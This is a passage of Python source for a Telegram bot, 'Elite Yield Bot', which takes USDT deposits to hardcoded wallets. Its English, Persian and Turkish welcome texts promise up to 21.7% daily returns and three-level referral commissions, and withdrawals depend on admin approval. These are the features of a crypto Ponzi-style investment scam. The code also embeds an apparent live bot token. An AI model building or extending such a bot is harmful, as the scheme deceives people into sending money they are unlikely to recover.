import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
import threading
import time
import logging
from datetime import datetime

logging.basicConfig(filename='bot_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

BOT_TOKEN = '8268425583:AAFkSCeYzXAU2gcyz-tZLSwpzVg0uZ061IU'
ADMIN_ID = 7989867522
ADMIN_USERNAME = '@YourAdminUsername'

bot = telebot.TeleBot(BOT_TOKEN)

TRC20_WALLET = "TQzZgrHNtG9i8mGufpvW12sxFuy"
BEP20_WALLET = "0x7485e33695b722aA071A868bb6959533a3e449b02E"

conn = sqlite3.connect('elite_yield.db', check_same_thread=False)

def get_cursor():
    return conn.cursor()

cursor = get_cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    balance REAL DEFAULT 0,
    total_profit REAL DEFAULT 0,
    level TEXT DEFAULT 'Level1',
    last_profit_time INTEGER DEFAULT 0,
    referrer_id INTEGER DEFAULT NULL,
    created_at INTEGER DEFAULT 0,
    language TEXT DEFAULT 'en',
    deposit_amount REAL DEFAULT 0
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS pending_deposits (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    amount REAL,
    status TEXT DEFAULT 'pending',
    created_at INTEGER
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS pending_withdraws (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    amount REAL,
    wallet_address TEXT,
    status TEXT DEFAULT 'pending',
    created_at INTEGER
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS support_messages (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    message_text TEXT,
    status TEXT DEFAULT 'new',
    created_at INTEGER
)''')
conn.commit()

languages = {
    'en': {
        'welcome': """🌟 Welcome to Elite Yield Bot! 🚀

Unlock up to 21.7% DAILY returns on your USDT investments! 💰

💎 Levels based on deposit:
• $10-99: 16.6%
• $100-799: 17.9%  
• $800-2399: 19.6%
• $2400-5999: 21.7%

💳 Min deposit: $10 USDT
🌐 Networks: TRC20 or BEP20

Start earning passive income today! 📈""",
        'balance_btn': 'Balance',
        'deposit_btn': 'Deposit',
        'withdraw_btn': 'Withdraw',
        'referral_btn': 'Referral',
        'support_btn': 'Support',
        'admin_btn': 'Admin Panel',
        'support_tickets_btn': 'Support Tickets',
        'balance': """Your Balance: ${balance:.2f} USDT
Total Profit: ${total_profit:.2f} USDT
Level: {level}""",
        'deposit_instructions': """Deposit Instructions:

Send USDT to one of these addresses:
TRC20 (Tron): `{TRC20_WALLET}`
BEP20 (BSC): `{BEP20_WALLET}`

Minimum: $10
Only USDT - no other tokens!

Enter amount to deposit:""",
        'enter_amount': 'Enter amount (min $10):',
        'invalid_amount': 'Invalid amount!',
        'confirm_deposit': 'Confirm ${amount}',
        'withdraw_submitted': 'Withdrawal request submitted! Waiting for admin approval...',
        'referral_text': """Your Referral Link:
`{ref_link}`

Referrals: {ref_count}
Earn 10% L1, 8% L2, 3% L3 commissions!""",
        'support': 'Send your message to support:',
        'choose_language': 'Choose your language:',
        'english': 'English',
        'persian': 'Persian',
        'turkish': 'Turkish',
        'arabic': 'Arabic',
        'daily_profit': 'Daily profit added: ${profit:.2f} ({rate}% rate)!\nNew balance: ${new_balance:.2f}'
    },
    'fa': {
        'welcome': """خوش آمدید به Elite Yield Bot! 🚀

بازدهی تا 21.7% روزانه روی سرمایه USDT خود را باز کنید! 💰

سطوح بر اساس واریز:
• 10-99$: 16.6%
• 100-799$: 17.9%  
• 800-2399$: 19.6%
• 2400-5999$: 21.7%

حداقل واریز: 10$ USDT
شبکه‌ها: TRC20 یا BEP20

از امروز درآمد غیرفعال کسب کنید! 📈""",
        'balance_btn': 'موجودی',
        'deposit_btn': 'واریز',
        'withdraw_btn': 'برداشت',
        'referral_btn': 'رفرال',
        'support_btn': 'پشتیبانی',
        'admin_btn': 'پنل ادمین',
        'support_tickets_btn': 'تیکت‌های پشتیبانی',
        'balance': """موجودی شما: ${balance:.2f} USDT
سود کل: ${total_profit:.2f} USDT
سطح: {level}""",
        'deposit_instructions': """دستورالعمل واریز:

USDT را به یکی از آدرس‌ها ارسال کنید:
TRC20 (Tron): `{TRC20_WALLET}`
BEP20 (BSC): `{BEP20_WALLET}`

حداقل: 10$
فقط USDT - توکن دیگر نه!

مبلغ واریز را وارد کنید:""",
        'enter_amount': 'مبلغ را وارد کنید (حداقل 10$):',
        'invalid_amount': 'نامعتبر!',
        'confirm_deposit': 'تأیید ${amount}',
        'withdraw_submitted': 'درخواست برداشت ثبت شد! منتظر ادمین.',
        'referral_text': """لینک رفرال شما:
`{ref_link}`

رفرال‌ها: {ref_count}
10% L1, 8% L2, 3% L3 کمیسیون!""",
        'support': 'پیام خود را به پشتیبانی بفرستید:',
        'choose_language': 'زبان انتخاب کنید:',
        'english': 'English',
        'persian': 'فارسی',
        'turkish': 'Türkçe',
        'arabic': 'العربية',
        'daily_profit': 'سود روزانه اضافه شد: ${profit:.2f} ({rate}% نرخ)!\nموجودی جدید: ${new_balance:.2f}'
    },
    'tr': {
        'welcome': """Elite Yield Bot'a Hoş Geldiniz! 🚀

USDT yatırımlarınızda günlük %21.7'ye kadar getiri kilidini açın! 💰

Yatırım bazlı seviyeler:
• $10-99: %16.6
• $100-799: %17.9  
• $800-2399: %19.6
• $2400-5999: %21.7

Min yatırım: $10 USDT
Ağlar: TRC20 veya BEP20

Bugün pasif gelir kazanmaya başlayın! 📈""",
        'balance_btn': 'Bakiye',
        'deposit_btn': 'Yatırım',
        'withdraw_btn': 'Çekim',
